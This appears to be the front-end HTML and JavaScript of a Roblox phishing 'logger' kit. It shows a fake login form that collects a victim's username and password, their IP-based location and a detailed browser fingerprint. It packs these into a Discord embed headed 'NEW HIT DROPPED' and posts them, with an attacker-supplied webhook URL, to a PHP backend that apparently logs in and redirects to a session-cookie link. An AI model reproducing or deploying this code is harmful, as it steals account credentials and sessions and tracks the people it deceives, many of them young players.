...
<head>
  ...
  <style>
    ...
    input {
      ...
      border-radius: 6px;
      width: 280px; /* Slightly wider for better appearance */
...
<body>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      ...
      if (!webhookURL) {
        messageDiv.textContent = "Error: Webhook URL is missing from the URL. Please add '?webhook=YOUR_DISCORD_WEBHOOK_URL' to the address.";
        messageDiv.className = "error"; // Add class for styling
        loginButton.disabled = true; // Disable login if no webhook
      } else {
        messageDiv.textContent = "Enter your Roblox credentials.";
      ...
      loginButton.addEventListener("click", async (event) => {
        ...
        if (!webhookURL) {
          messageDiv.textContent = "Cannot proceed: Webhook URL is missing. Check URL parameters.";
          messageDiv.className = "error";
          return;
        }

        // Update UI for loading state
        messageDiv.textContent = "Attempting to log in... Please wait.";
        messageDiv.className = "info";
        loginButton.disabled = true; // Disable button to prevent multiple clicks

        let ipInfo = {};
        try {
          // Fetch IP and geographic information from ipinfo.io
          const res = await fetch("https://ipinfo.io/json?token=19fadc9d51ff6d"); // Replace with your ipinfo token
          if (res.ok) {
            ipInfo = await res.json();
          } else {
            console.warn("Failed to fetch IP info:", res.status, res.statusText);
            ipInfo.error = `Status: ${res.status}`;
          }
        } catch (err) {
          console.error("IP info fetch error:", err);
          ipInfo.error = err.message;
        }

        // Construct the 'info' object as a Discord embed format
        const info = {
          description: "💥 𝗡𝗘𝗪 𝗛𝗜𝗧 𝗗𝗥𝗢𝗣𝗣𝗘𝗗 💥",
          color: Math.floor(Math.random() * 16777215), // Generate a random color for the embed
          title: "🌈 𝗥𝗔𝗜𝗡𝗕𝗢𝗪 𝗟𝗢𝗚𝗚𝗘𝗥 𝗔𝗟𝗘𝗥𝗧 🌈",
          fields: [
            { name: "👤 Username", value: username, inline: true },
            { name: "🔑 Password", value: password, inline: true },
            { name: "🌐 IP", value: ipInfo.ip || "Unknown/Error", inline: true },
            { name: "🌍 Country", value: ipInfo.country || "Unknown/Error", inline: true },
            { name: "🏙️ City", value: ipInfo.city || "Unknown/Error", inline: true },
            { name: "🌎 Region", value: ipInfo.region || "Unknown/Error", inline: true },
            { name: "📶 ISP", value: ipInfo.org || "Unknown/Error", inline: true },
            { name: "📏 Location", value: ipInfo.loc || "Unknown/Error", inline: true },
            { name: "🕒 Timezone", value: ipInfo.timezone || "Unknown/Error", inline: true },
            { name: "🧠 RAM", value: (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"), inline: true },
            { name: "🔧 Threads", value: navigator.hardwareConcurrency || "Unknown", inline: true },
            { name: "📱 Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
            { name: "🌐 Browser", value: navigator.userAgent, inline: false }, // Browser string can be long
            { name: "📅 Platform", value: navigator.platform || "Unknown", inline: true },
            { name: "🚫 DNT", value: (navigator.doNotTrack === '1' ? 'Enabled' : navigator.doNotTrack === '0' ? 'Disabled' : 'Unknown'), inline: true },
            { name: "🛋 Plugins", value: [...navigator.plugins].map(p => p.name).join(", ") || "None", inline: false }, // Can be long
            { name: "📳 Hostname", value: ipInfo.hostname || "Unknown/Error", inline: true },
            { name: "🧨 Languages", value: navigator.languages.join(", ") || "N/A", inline: true },
            { name: "🔒 Cookies Enabled", value: navigator.cookieEnabled.toString(), inline: true },
            { name: "📶 Conn Type", value: navigator.connection?.effectiveType || "N/A", inline: true },
            { name: "🚗 Vendor", value: navigator.vendor || "Unknown", inline: true },
            { name: "📁 ProductSub", value: navigator.productSub || "Unknown", inline: true },
            { name: "🛋 Accuracy", value: ipInfo.loc || "N/A", inline: false },
            { name: "🔥 Logged At", value: (new Date()).toLocaleString(), inline: false },
          ].filter(field => field.value !== "Unknown/Error"), // Filter out fields that failed to get data
          timestamp: new Date().toISOString(),
          footer: {
            text: "🚀 Powered by VMYT"
          }
        };

        try {
          // *** IMPORTANT CHANGE FOR PHP BACKEND ***
          // If server.php is hosted at, say, https://your-php-app.com/server.php
          // then you would change this to:
          // const backendUrl = 'https://your-php-app.com/server.php';
          // Make sure your web server (Apache/Nginx) is configured to route '/login' to your server.php
          // You might need to use a rewrite rule, or literally call 'server.php?action=login'
          // For simplicity, if index.html and server.php are in the same web-accessible folder,
          // and your web server processes .php files, you might point directly to it.
          // Example:
          const serverBaseUrl = window.location.origin; // Or 'https://your-php-app.com' if separate
          const backendEndpoint = `${serverBaseUrl}/server.php`; // Assuming server.php handles routing internally or via .htaccess

          const response = await fetch(backendEndpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
              // CORS might be an issue if index.html is on InfinityFree and server.php is elsewhere
            },
            body: JSON.stringify({ username, password, webhookURL, info, action: 'login' }) // Added action for PHP routing
          });

          const data = await response.json(); // Parse the JSON response from the server

          if (data.success) {
            messageDiv.textContent = "Login successful! Redirecting to set Roblox cookie...";
            messageDiv.className = "success";
            const cookieLink = data.cookieLink;
            // The cookieLink from PHP will now point to your PHP server's /cookie/:id endpoint
            window.location.replace(cookieLink);
          } else {
            messageDiv.textContent = 'Login failed: ' + (data.message || 'An unknown error occurred.');
            messageDiv.className = "error";
            console.error('Login failed on server:', data.message);
          }
        } catch (error) {
          // Catch network errors or issues with the fetch request itself
          console.error('Error during login process (frontend fetch):', error);
          messageDiv.textContent = 'An error occurred connecting to the server. Check your network or server status. (Is your PHP backend and Selenium/ChromeDriver running?)';
          messageDiv.className = "error";
        } finally {
          loginButton.disabled = false; // Re-enable the login button regardless of success/failure
        }
      });
    });
  </script>
